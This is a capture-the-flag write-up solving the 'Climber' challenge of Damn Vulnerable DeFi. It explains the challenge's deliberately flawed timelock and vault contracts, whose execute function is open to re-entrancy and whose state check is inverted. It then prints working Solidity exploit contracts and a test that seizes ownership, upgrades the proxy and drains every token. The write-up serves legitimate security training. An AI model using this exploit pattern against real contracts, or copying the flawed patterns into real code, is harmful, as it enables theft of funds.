---
title: 'Damn Vulnerable DeFi Challenge #12 Solution — Climber'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>We need to find a way to steal all the DVT token in the Climber Vault.'
coverImage:
  url: '/assets/blog/ethereum.jpg'
  credit:
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2023-01-14T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

This is Part 12 of the ["Let’s play Damn Vulnerable DeFi CTF"](https://stermi.xyz/blog/lets-play-damn-vulnerable-defi) series, where I will explain how to solve each challenge.

> [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.
> Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #12  — Climber

> There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).
>
> The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
>
> On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.
>
> On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.
>
> To pass this challenge, take all tokens from the vault.

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/climber)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v3.0.0/test/climber/climber.challenge.js)

## The attacker end goal

We start with no ETH and no DVT tokens, and our goal is to be able to steal all the DVT tokens that are stored inside the Climber Vault.

## Study the contracts

First (as you should do in any auditing project) you should be very aware of the architecture and deployment status of the whole set of contracts.

### `ClimberVault`

The `ClimberVault` is the vault contract where all the DVT token are stored.
It is an **upgradable** contract accessed via a **Proxy Contract**. The contract in fact inherit from the [OpenZeppelin UUPSUpgradeable](https://docs.openzeppelin.com/contracts/4.x/api/proxy#UUPSUpgradeable) contract implementation.

There are two main roles:

- The Owner (ClimberTimelock in this case) that can **withdraw** a limited number of tokens once in a while (1 token each 15 days). The owner can also **upgrade** the contract to a different implementation (like you would normally do in a UUPSUpgradeable pattern)
- The Sweeper that can call `sweepFunds` and withdraw **all** the funds owned by the vault.
- The Sweeper cannot be changed after the contract has been initialized

If we look close at the contract, the only way to being able to steal all the DVT tokens are these:

1. Become the Owner and upgrade the implementation to our own implementation where we can do whatever we want (transfer all the funds)
2. Become the Sweeper and be able to execute the `sweepFunds` function

The ownership of the contract has been already transferred to the `ClimberTimelock` and there's no way to access directly to it or transfer from ourselves via the `ClimberVault`.

Same thing for the second options, the `_setSweeper` function that can change the sweeper address is `internal` so cannot be called externally.

It's not possible to attack the contract directly.

## `ClimberTimelock`

This contract mimics the [OpenZeppelin Timelock](https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController) controller implementation. What does this contract do?

- Allow the execution of a bulk of operations only if those operations have been previously **scheduled** and a **specific delay** has passed
- Allow only a specific **role** to propose operations
- Allow anyone to execute the bulk of operations
- Operations are executed via a low-level **`call`** (`delegatecall` is not supported)
- Only the contract admin can administer the roles

### `constructor` of the contract

If we look at the `constructor` we can understand how it's setupped (note that this contract is not upgradable!)

- The admin role can administer the `ADMIN_ROLE`
- The admin role can administer the `PROPOSER_ROLE`
- `address admin` is part of the `ADMIN_ROLE` group
- `address(this)` (the contract itself) is part of the `ADMIN_ROLE` group
- `address proposer` is part of the `PROPOSER_ROLE`
- `delay` (after how many seconds a scheduled operation can be executed) is set by default at `1 hours`

By looking at the contract, we can understand that

- `admin` can manage the `ADMIN_ROLE`
- `address(this)` (the Timelocker contract itself) can manage both the `ADMIN_ROLE` and `PROPOSER_ROLE`
- `proposer` can access to all the functions that have the `onlyRole(PROPOSER_ROLE)` modifier

### The `getOperationId` function

Nothing fancy to see here

```solidity
function getOperationId(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) public pure returns (bytes32) {
    return keccak256(abi.encode(targets, values, dataElements, salt));
}
```

This function simply concat the inputs that define an operation, hash them, and return the result as the ID of the operation.

### The `schedule` function

This is the function that can be called **only** by someone who is part of the `PROPOSER` role and allow scheduling an **operation**. Each operation can contain one or more transaction to be executed via the Timelocker.

```solidity
function schedule(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) external onlyRole(PROPOSER_ROLE) {
    require(targets.length > 0 && targets.length < 256);
    require(targets.length == values.length);
    require(targets.length == dataElements.length);

    bytes32 id = getOperationId(targets, values, dataElements, salt);
    require(getOperationState(id) == OperationState.Unknown, "Operation already known");

    operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
    operations[id].known = true;
}
```

As you can see, there are some sanity checks to schedule an operation that makes sense, they check that the operation has not been registered yet (note that you could schedule the same operation but just with different salt) and if everything pass they register it in the `operations` mapping.

In theory, the operation will be able to be executed after `delay` of seconds has passed.

### The `updateDelay` function

This function can be called **only** by the Timelocker itself, and the `newDelay` must be lower or equal than `14 days`

```solidity
function updateDelay(uint64 newDelay) external {
    require(msg.sender == address(this), "Caller must be timelock itself");
    require(newDelay <= 14 days, "Delay must be 14 days or less");
    delay = newDelay;
}
```

By having the `require(msg.sender == address(this)` requirements, this mean that the `delay` can be changed only via an `operation` proposed by a `PROPOSER` role member.

Note that by setting the `newDelay` equal to zero it means that **an operation can be executed as soon as it has been scheduled** without waiting for any safe delay.

Should this function have **also** a **lower bound** check for the `newDelay` value to prevent these cases?

### The `getOperationState` function

This function is responsible to check the state of an operation and is used by the `execute` function to prevent an operation to be executed if

- it has already been executed
- it has never been scheduled
- it has been scheduled but the `delay` has not passed yet

```solidity
function getOperationState(bytes32 id) public view returns (OperationState) {
    Operation memory op = operations[id];

    if(op.executed) {
        return OperationState.Executed;
    } else if(op.readyAtTimestamp >= block.timestamp) {
        return OperationState.ReadyForExecution;
    } else if(op.readyAtTimestamp > 0) {
        return OperationState.Scheduled;
    } else {
        return OperationState.Unknown;
    }
}
```

If you look closely at the code, it seems that the `ReadyForExecution` is not done correctly. When an operation is scheduled, the contract set the `readyAtTimestamp` equal to `uint64(block.timestamp) + delay`.

As far as I understand, an operation should be **executable ONLY when `readyAtTimestamp` is lower or equal to `block.timestamp`**

With the current check, as soon someone schedules an operation, that operation can be executed immediately. The consequence is that the Timelock logic is totally worthless, no matter what `delay` value you have.

I'm pretty confident that this bug has been introduced without really wanting it to be there because it's not relevant for the solution of the challenge.

### The `execute` function

The `execute` function as you can see can be executed by no one. The `Timelock` contract put all the auth effort on top of the `schedule` function, and it makes sense.

If the operation has been scheduled and the delay has correctly passed, it's correct that anyone can execute the operation (if the contract is safe 😁)

```solidity
function execute(
    address[] calldata targets,
    uint256[] calldata values,
    bytes[] calldata dataElements,
    bytes32 salt
) external payable {
    require(targets.length > 0, "Must provide at least one target");
    require(targets.length == values.length);
    require(targets.length == dataElements.length);

    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length; i++) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    require(getOperationState(id) == OperationState.ReadyForExecution, "NOT ReadyForExecution");
    operations[id].executed = true;
}
```

Let's see what's happening there step-by-step

1. It performs a series of sanity checks on the input parameters
2. It generates the `id` of the `operation`
3. It executes **all** the operation by triggering a low-level `call`
4. It checks that the operation with the `id` could have been executed
5. it changes the operation `executeed` state to `true`

### Have you spotted the problem? Brainstorm an attack vector

The function does not follow correctly the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)!

All the checks and contract's storage modification should be done **before** any external interactions because otherwise you are probably opening the contract to some **re-entrancy** attacks!

While the problem and the solution to fix it are pretty simple, the attack vector to achieve our goals is a little bit more complicated.

**Remember:** our goal is to be able to **steal** all the DVT tokens stored in the `ClimbVault` that are owned by the `ClimbTimelock`.

As we said, one possible option to solve the challenge is to become the Owner of the `ClimbVault` and upgrade the implementation to our own implementation where we can do whatever we want (transfer all the funds).

How can we leverage the **re-entrancy** exploit to reach our goal? We know that we can execute some low-level `call` without having the operation scheduled, but at the end of the function the contracts do that check anyway (`require(getOperationState(id) == OperationState.ReadyForExecution, "NOT ReadyForExecution")`)

What we need to do is execute an operation that

1. Make the `ClimbTimelock` itself transfer the ownership of the `ClimbVault` to the `attacker`
2. Schedule the operation just before the check is done to prevent the revert

The first part is pretty easy, we just need to make the `ClimbTimelock` contract, that is already the owner of the vault, execute the `ClimbVault.transferOwnership` function.
The second part is a little bit more convoluted but still achievable if we break it down in smaller steps

1. To be able to schedule an operation, we must be part of the `PROPOSER` role
2. Because we can execute arbitrary `call` (in which the `msg.sender` is the `ClimberTimelock` itself) we can execute a `grantRole(PROPOSER_ROLE, middleman)` giving to the `middleman` contract the proposer role. This is possible because the `ClimberTimelock` is **also** part of the admin group!
3. At this point, we can execute a low level `call` on the `middleman` contract that will schedule the whole operation just before the `require(getOperationState(id) == OperationState.ReadyForExecution, "NOT ReadyForExecution")` is performed

Note that all of this is possible just because the bug we found in the `getOperationState` function that allow us to execute an operation as soon as it has been scheduled.

What if that bug was not present? Well, because we can execute arbitrary low-level `call` and because those calls are executed by the `ClimberTimelock` itself (that becomes the `msg.sender`) we can simply append the execution of a `updateDelay(0)` that will set the new delay equal to `0` just before the operation has been scheduled allowing us to instantly execute it without waiting for a delay.

## Prepare the attack

Now that we have found the solution, it's pretty easy to write the test to prove it.

First we have to deploy our new implementation used to steal all the DVT funds

```solidity
contract PawnedClimberVault is ClimberVault {

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function withdrawAll(address tokenAddress) external onlyOwner {
        // withdraw the whole token balance from the contract
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }

}
```

After that, the attacker has gained the ownership of the vault, it will switch the implementation to the new one and call `withdrawAll(address(token))`

After that, we need to also deploy our middle man contract that will schedule the operation just before the final `require` check done by the `execute` function.

```solidity
contract Middleman {

    function scheduleOperation(address attacker, address vaultAddress, address vaultTimelockAddress, bytes32 salt) external {
        // Recreate the scheduled operation from the Middle man contract and call the vault
        // to schedule it before it will check (inside the `execute` function) if the operation has been scheduled
        // This is leveraging the existing re-entrancy exploit in `execute`
        ClimberTimelock vaultTimelock = ClimberTimelock(payable(vaultTimelockAddress));

        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        // set the attacker as the owner
        targets[0] = vaultAddress;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

        // set the attacker as the owner
        targets[1] = vaultTimelockAddress;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimelock.PROPOSER_ROLE(), address(this));

        // create the proposal
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)",attacker, vaultAddress, vaultTimelockAddress, salt);

        vaultTimelock.schedule(targets, values, dataElements, salt);
    }

}
```

The role of this contract is just to re-create the whole operation data and schedule it on the `ClimberTimelock` contract.

Now that we have prepared the ground, it is time to execute the exploit

```solidity
// Deploy the external contract that will take care of executing the `schedule` function
Middleman middleman = new Middleman();

// prepare the operation data composed by 3 different actions
bytes32 salt = keccak256("attack proposal");
address[] memory targets = new address[](3);
uint256[] memory values = new uint256[](3);
bytes[] memory dataElements = new bytes[](3);

// set the attacker as the owner of the vault as the first operation
targets[0] = address(vault);
values[0] = 0;
dataElements[0] = abi.encodeWithSignature("transferOwnership(address)", attacker);

// grant the PROPOSER role to the middle man contract will schedule the operation
targets[1] = address(vaultTimelock);
values[1] = 0;
dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", vaultTimelock.PROPOSER_ROLE(), address(middleman));

// call the external middleman contract to schedule the operation with the needed data
targets[2] = address(middleman);
values[2] = 0;
dataElements[2] = abi.encodeWithSignature("scheduleOperation(address,address,address,bytes32)", attacker, address(vault), address(vaultTimelock), salt);

// anyone can call the `execute` function, there's no auth check over there
vm.prank(attacker);
vaultTimelock.execute(targets, values, dataElements, salt);

// at this point `attacker` is the owner of the ClimberVault and he can do what ever he wants
// For example we could upgrade to a new implementation that allow us to do whatever we want
// Deploy the new implementation
vm.startPrank(attacker);
PawnedClimberVault newVaultImpl = new PawnedClimberVault();

// Upgrade the proxy implementation to the new vault
vault.upgradeTo(address(newVaultImpl));

// withdraw all the funds
PawnedClimberVault(address(vault)).withdrawAll(address(token));
vm.stopPrank();
```

You can find the full solution on GitHub, looking at [ClimberTest.t.sol](https://github.com/StErMi/forge-damn-vulnerable-defi/blob/main/src/test/climber/ClimberTest.t.sol)

If you want to try yourself locally, just execute `forge test --match-contract ClimberTest -vv`

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION
